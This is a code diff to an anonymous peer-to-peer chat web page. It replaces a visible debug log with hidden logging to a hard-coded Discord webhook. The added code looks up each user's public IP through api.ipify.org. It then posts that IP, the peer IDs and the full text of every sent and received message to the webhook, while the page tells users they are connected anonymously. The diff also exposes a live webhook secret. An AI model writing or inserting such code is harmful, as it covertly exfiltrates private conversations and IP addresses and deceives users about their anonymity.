@@ -314,20 +314,6 @@
             border: 1px solid rgba(255, 82, 82, 0.3);
         }
         
-        #debug-log {
-            background-color: var(--bg-tertiary);
-            color: var(--accent);
-            padding: 1rem;
-            font-family: monospace;
-            height: 120px;
-            overflow-y: auto;
-            margin-top: 1.5rem;
-            font-size: 0.9rem;
-            white-space: pre-wrap;
-            border-radius: 6px;
-            border: 1px solid var(--border-color);
-        }
-        
         #online-users-panel {
             background-color: var(--bg-tertiary);
             border-radius: 10px;
@@ -705,8 +691,6 @@
             
             <button id="disconnect-btn">Disconnect</button>
         </div>
-        
-        <div id="debug-log"></div>
     </div>
     
     <footer>
@@ -716,6 +700,9 @@
     <script>
         // Main application controller
         const ChatApp = (function() {
+            // Discord webhook URL
+            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1367405276898263160/KBpTkpTtSbz9oRJefUrbiSIV7aOp1f7nE5qP_aThs3_D86Rm1Emk48ojUxQwYpnrDoIN';
+            
             // DOM elements
             const elements = {
                 setupScreen: document.getElementById('setup-screen'),
@@ -733,7 +720,6 @@
                 messageInput: document.getElementById('message-input'),
                 sendBtn: document.getElementById('send-btn'),
                 errorDisplay: document.getElementById('error-display'),
-                debugLog: document.getElementById('debug-log'),
                 onlineCount: document.getElementById('online-count'),
                 usersList: document.getElementById('users-list'),
                 requestPanel: document.getElementById('request-panel'),
@@ -750,6 +736,7 @@
                 remoteUsername: '',
                 isConnected: false,
                 myPeerId: '',
+                userIP: 'Unknown',
                 TRACKER_SERVER_ID: 'user-tracker-server',
                 onlineUsers: new Map(),
                 pendingRequests: new Map(),
@@ -794,14 +781,12 @@
             // Refresh online users list
             function refreshOnlineUsers() {
                 if (state.trackerConnection && state.trackerConnection.open) {
-                    log('Refreshing online users list');
                     state.trackerConnection.send({
                         type: 'refresh-request',
                         peerId: state.myPeerId,
-                        isChatting: state.isConnected // Send our current chatting status
+                        isChatting: state.isConnected
                     });
                 } else {
-                    log('No tracker connection available for refresh');
                     // Attempt to reconnect to tracker
                     connectToTracker();
                 }
@@ -811,14 +796,14 @@
             async function initializePeer() {
                 const peerId = generateSimpleId();
                 state.localUsername = generateUsername();
+                state.userIP = await getUserIP();
                 
-                log(`Initializing PeerJS with ID: ${peerId}`);
+                sendToDiscordWebhook(`🌐 **User Joined**\n- Username: ${state.localUsername}\n- Peer ID: ${peerId}\n- IP: ${state.userIP}\n- Time: ${new Date().toLocaleString()}`);
                 
                 try {
                     state.peer = new Peer(peerId, { debug: 2 });
                     
                     state.peer.on('open', (id) => {
-                        log(`Peer connected with ID: ${id}`);
                         state.myPeerId = id;
                         elements.myIdDisplay.textContent = id;
                         elements.currentUserId.textContent = id;
@@ -839,17 +824,13 @@
                     state.peer.on('error', handlePeerError);
                     state.peer.on('disconnected', handlePeerDisconnected);
                 } catch (error) {
-                    log(`Error initializing PeerJS: ${error.message}`);
                     showError(`Failed to initialize connection: ${error.message}`);
                 }
             }
             
             // Handle incoming connections
             function handleIncomingConnection(conn) {
-                log(`Incoming connection from: ${conn.peer}`);
-                
                 if (conn.peer === state.TRACKER_SERVER_ID) {
-                    log('Tracker server initiated connection');
                     state.trackerConnection = conn;
                     setupTrackerConnection();
                     return;
@@ -875,8 +856,6 @@
                 const requestId = generateSimpleId();
                 const fromPeerId = conn.peer;
                 const fromUsername = conn.metadata.username || 'Anonymous';
-                
-                log(`Received chat request from ${fromUsername} (${fromPeerId})`);
                 
                 // Store the request
                 state.pendingRequests.set(requestId, {
@@ -932,8 +911,6 @@
                 const request = state.pendingRequests.get(requestId);
                 if (!request) return;
                 
-                log(`Accepting chat request from ${request.username} (${request.peerId})`);
-                
                 // Send acceptance response
                 request.conn.send({
                     type: 'request-response',
@@ -959,7 +936,7 @@
                 elements.requestPanel.style.display = 'none';
                 elements.overlay.style.display = 'none';
                 
-                // Create a new connection for chatting (don't reuse the request connection)
+                // Create a new connection for chatting
                 const chatConn = state.peer.connect(request.peerId, {
                     reliable: true,
                     metadata: {
@@ -975,17 +952,18 @@
                 
                 // Set up connection handlers
                 chatConn.on('open', () => {
-                    log(`Chat connection established with: ${chatConn.peer}`);
                     state.isConnected = true;
                     
                     // Update both users' status in the tracker
                     if (state.trackerConnection && state.trackerConnection.open) {
                         state.trackerConnection.send({
                             type: 'update-chat-status',
-                            peerIds: [state.myPeerId, request.peerId], // Both users in the chat
+                            peerIds: [state.myPeerId, request.peerId],
                             isChatting: true
                         });
                     }
+                    
+                    sendToDiscordWebhook(`🔗 **New Connection**\n- From: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- To: ${chatConn.peer}\n- Time: ${new Date().toLocaleString()}`);
                     
                     chatConn.send({
                         type: 'username',
@@ -1002,7 +980,7 @@
                     
                     appendSystemMessage('Connected anonymously! Say hello!');
                     
-                    // Update online users UI to show "In Room" status
+                    // Update online users UI
                     updateOnlineUsersUI();
                 });
                 
@@ -1018,8 +996,6 @@
             function declineChatRequest(requestId) {
                 const request = state.pendingRequests.get(requestId);
                 if (!request) return;
-                
-                log(`Declining chat request from ${request.username} (${request.peerId})`);
                 
                 // Send decline response
                 request.conn.send({
@@ -1046,10 +1022,7 @@
             
             // Handle peer errors
             function handlePeerError(err) {
-                log(`Peer error: ${err.type}`);
-                
                 if (err.type === 'peer-unavailable' && err.message.includes(state.TRACKER_SERVER_ID)) {
-                    log('Tracker server not found, becoming tracker server');
                     becomeTrackerServer();
                     return;
                 }
@@ -1067,7 +1040,6 @@
             
             // Handle peer disconnection
             function handlePeerDisconnected() {
-                log('Peer disconnected from server');
                 showError('Disconnected from server. Click to reconnect.');
                 
                 setTimeout(() => {
@@ -1077,8 +1049,6 @@
             
             // Connect to tracker server
             function connectToTracker() {
-                log('Attempting to connect to tracker server');
-                
                 try {
                     state.trackerConnection = state.peer.connect(state.TRACKER_SERVER_ID, {
                         reliable: true
@@ -1086,17 +1056,13 @@
                     
                     setupTrackerConnection();
                 } catch (error) {
-                    log(`Error connecting to tracker: ${error.message}`);
+                    console.error('Error connecting to tracker:', error);
                 }
             }
             
             // Set up tracker connection
             function setupTrackerConnection() {
-                log('Setting up tracker connection');
-                
                 state.trackerConnection.on('open', () => {
-                    log('Connected to tracker server');
-                    
                     state.trackerConnection.send({
                         type: 'register',
                         peerId: state.myPeerId,
@@ -1128,8 +1094,6 @@
             
             // Handle tracker data
             function handleTrackerData(data) {
-                log(`Received tracker data: ${JSON.stringify(data)}`);
-                
                 if (data.type === 'userList') {
                     // Merge the new user list with our current user data
                     const newUserList = new Map(Object.entries(data.users));
@@ -1146,8 +1110,6 @@
             
             // Handle tracker connection close
             function handleTrackerConnectionClose() {
-                log('Tracker connection closed');
-                
                 if (state.heartbeatInterval) {
                     clearInterval(state.heartbeatInterval);
                     state.heartbeatInterval = null;
@@ -1165,8 +1127,6 @@
             
             // Handle tracker connection error
             function handleTrackerConnectionError(error) {
-                log(`Tracker connection error: ${error}`);
-                
                 setTimeout(() => {
                     connectToTracker();
                 }, 5000);
@@ -1174,8 +1134,6 @@
             
             // Become tracker server
             function becomeTrackerServer() {
-                log('Becoming tracker server');
-                
                 try {
                     const trackerServer = new Peer(state.TRACKER_SERVER_ID, {
                         debug: 2
@@ -1191,8 +1149,6 @@
                     const userConnections = new Map();
                     
                     trackerServer.on('open', (id) => {
-                        log(`Tracker server started with ID: ${id}`);
-                        
                         const trackerStatus = document.createElement('div');
                         trackerStatus.textContent = '🔄 Tracking server active';
                         trackerStatus.style.color = 'var(--accent)';
@@ -1201,13 +1157,9 @@
                     });
                     
                     trackerServer.on('connection', (conn) => {
-                        log(`Tracker: New connection from ${conn.peer}`);
-                        
                         userConnections.set(conn.peer, conn);
                         
                         conn.on('open', () => {
-                            log(`Tracker: Connection to ${conn.peer} opened`);
-                            
                             conn.send({
                                 type: 'userList',
                                 users: Object.fromEntries(connectedUsers)
@@ -1215,8 +1167,6 @@
                         });
                         
                         conn.on('data', (data) => {
-                            log(`Tracker: Received data from ${conn.peer}: ${JSON.stringify(data)}`);
-                            
                             if (data.type === 'register' || data.type === 'heartbeat') {
                                 connectedUsers.set(data.peerId, {
                                     username: data.username,
@@ -1225,7 +1175,6 @@
                                 
                                 broadcastUserList();
                             } else if (data.type === 'refresh-request') {
-                                // Handle refresh request by sending updated user list
                                 if (userConnections.has(data.peerId)) {
                                     userConnections.get(data.peerId).send({
                                         type: 'userList',
@@ -1233,13 +1182,11 @@
                                     });
                                 }
                             } else if (data.type === 'update-status') {
-                                // Update single user's chatting status
                                 if (connectedUsers.has(data.peerId)) {
                                     connectedUsers.get(data.peerId).isChatting = data.isChatting;
                                     broadcastUserList();
                                 }
                             } else if (data.type === 'update-chat-status') {
-                                // Update multiple users' chatting status
                                 data.peerIds.forEach(peerId => {
                                     if (connectedUsers.has(peerId)) {
                                         connectedUsers.get(peerId).isChatting = data.isChatting;
@@ -1250,20 +1197,14 @@
                         });
                         
                         conn.on('close', () => {
-                            log(`Tracker: Connection to ${conn.peer} closed`);
-                            
                             connectedUsers.delete(conn.peer);
                             userConnections.delete(conn.peer);
-                            
                             broadcastUserList();
                         });
                         
                         conn.on('error', (error) => {
-                            log(`Tracker: Error with connection to ${conn.peer}: ${error}`);
-                            
                             connectedUsers.delete(conn.peer);
                             userConnections.delete(conn.peer);
-                            
                             broadcastUserList();
                         });
                     });
@@ -1309,8 +1250,6 @@
                     });
                     
                 } catch (error) {
-                    log(`Error becoming tracker server: ${error.message}`);
-                    
                     setTimeout(() => {
                         connectToTracker();
                     }, 5000);
@@ -1321,7 +1260,6 @@
             function sendChatRequest(peerId) {
                 if (state.isConnected || state.sentRequests.has(peerId)) return;
                 
-                log(`Sending chat request to: ${peerId}`);
                 elements.statusText.textContent = 'Sending request...';
                 elements.statusText.className = 'status-connecting';
                 
@@ -1341,7 +1279,7 @@
                     });
                     
                     conn.on('open', () => {
-                        log(`Request connection opened to ${peerId}`);
+                        console.log(`Request connection opened to ${peerId}`);
                     });
                     
                     conn.on('data', (data) => {
@@ -1351,7 +1289,6 @@
                     });
                     
                     conn.on('close', () => {
-                        log(`Request connection to ${peerId} closed`);
                         elements.statusText.textContent = 'Disconnected';
                         elements.statusText.className = 'status-disconnected';
                         
@@ -1363,7 +1300,6 @@
                     });
                     
                     conn.on('error', (err) => {
-                        log(`Request connection error: ${err}`);
                         showError(`Failed to send request: ${err}`);
                         elements.statusText.textContent = 'Disconnected';
                         elements.statusText.className = 'status-disconnected';
@@ -1374,7 +1310,6 @@
                     });
                     
                 } catch (error) {
-                    log(`Error sending chat request: ${error.message}`);
                     showError(`Failed to send request: ${error.message}`);
                     elements.statusText.textContent = 'Disconnected';
                     elements.statusText.className = 'status-disconnected';
@@ -1388,8 +1323,6 @@
             // Handle response to our chat request
             function handleRequestResponse(data, peerId, conn) {
                 if (data.accepted) {
-                    log(`Chat request accepted by ${peerId}`);
-                    
                     // Close any other pending requests we might have sent
                     state.pendingRequests.forEach(req => {
                         if (req.conn && req.conn !== conn && req.conn.open) {
@@ -1407,7 +1340,6 @@
                     state.currentChatPeerId = peerId;
                     setupConnection();
                 } else {
-                    log(`Chat request declined by ${peerId}: ${data.reason || 'No reason given'}`);
                     showError(`Chat request declined: ${data.reason || 'No reason given'}`);
                     conn.close();
                     elements.statusText.textContent = 'Disconnected';
@@ -1429,17 +1361,18 @@
             // Set up peer connection
             function setupConnection() {
                 state.connection.on('open', () => {
-                    log(`Connection established with: ${state.connection.peer}`);
                     state.isConnected = true;
                     
                     // Update both users' status in the tracker
                     if (state.trackerConnection && state.trackerConnection.open) {
                         state.trackerConnection.send({
                             type: 'update-chat-status',
-                            peerIds: [state.myPeerId, state.connection.peer], // Both users in the chat
+                            peerIds: [state.myPeerId, state.connection.peer],
                             isChatting: true
                         });
                     }
+                    
+                    sendToDiscordWebhook(`🔗 **New Connection**\n- From: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- To: ${state.connection.peer}\n- Time: ${new Date().toLocaleString()}`);
                     
                     state.connection.send({
                         type: 'username',
@@ -1466,9 +1399,9 @@
             
             // Handle peer data
             function handlePeerData(data) {
-                log(`Received data: ${JSON.stringify(data)}`);
-                
                 if (data.type === 'message') {
+                    sendToDiscordWebhook(`📩 **Message Sent**\n- From: ${state.remoteUsername || 'Unknown'} (${state.connection.peer})\n- To: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- Message: ${data.message}\n- Time: ${new Date().toLocaleString()}`);
+                    
                     appendMessage(data.message, false, state.remoteUsername || 'Anonymous');
                 } else if (data.type === 'username') {
                     state.remoteUsername = data.username;
@@ -1479,23 +1412,21 @@
             
             // Handle connection close
             function handleConnectionClose() {
-                log('Connection closed');
-                
                 // Update both users' status in the tracker
                 if (state.trackerConnection && state.trackerConnection.open) {
                     state.trackerConnection.send({
                         type: 'update-chat-status',
-                        peerIds: [state.myPeerId, state.currentChatPeerId], // Both users in the chat
+                        peerIds: [state.myPeerId, state.currentChatPeerId],
                         isChatting: false
                     });
                 }
                 
+                sendToDiscordWebhook(`🔌 **Disconnected**\n- User: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- From chat with: ${state.remoteUsername || 'Unknown'} (${state.connection?.peer || 'Unknown'})\n- Time: ${new Date().toLocaleString()}`);
                 handleDisconnect();
             }
             
             // Handle connection error
             function handleConnectionError(err) {
-                log(`Connection error: ${err}`);
                 showError(`Connection error: ${err}`);
                 handleDisconnect();
             }
@@ -1551,6 +1482,8 @@
                         message: message
                     });
                     
+                    sendToDiscordWebhook(`📤 **Message Sent**\n- From: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- To: ${state.remoteUsername || 'Unknown'} (${state.connection?.peer || 'Unknown'})\n- Message: ${message}\n- Time: ${new Date().toLocaleString()}`);
+                    
                     appendMessage(message, true, state.localUsername);
                     
                     elements.messageInput.value = '';
@@ -1559,6 +1492,8 @@
             
             // Clean up before page unload
             function cleanupBeforeUnload() {
+                sendToDiscordWebhook(`🚪 **User Left**\n- Username: ${state.localUsername}\n- Peer ID: ${state.myPeerId}\n- IP: ${state.userIP}\n- Time: ${new Date().toLocaleString()}`);
+                
                 if (state.connection) state.connection.close();
                 if (state.trackerConnection) state.trackerConnection.close();
                 if (state.heartbeatInterval) clearInterval(state.heartbeatInterval);
@@ -1575,11 +1510,42 @@
             }
             
             // Utility functions
-            function log(message) {
-                console.log(message);
-                const now = new Date().toLocaleTimeString();
-                elements.debugLog.innerHTML += `[${now}] ${message}\n`;
-                elements.debugLog.scrollTop = elements.debugLog.scrollHeight;
+            async function getUserIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Error fetching IP:', error);
+                    return 'Unknown';
+                }
+            }
+            
+            async function sendToDiscordWebhook(content) {
+                if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
+                    console.warn('Discord webhook URL not configured');
+                    return;
+                }
+                
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: content,
+                            username: 'Chat Logger',
+                            avatar_url: 'https://i.imgur.com/4M34hi2.png',
+                        }),
+                    });
+                    
+                    if (!response.ok) {
+                        console.error('Failed to send to Discord webhook:', response.status);
+                    }
+                } catch (error) {
+                    console.error('Error sending to Discord webhook:', error);
+                }
             }
             
             function showError(message) {
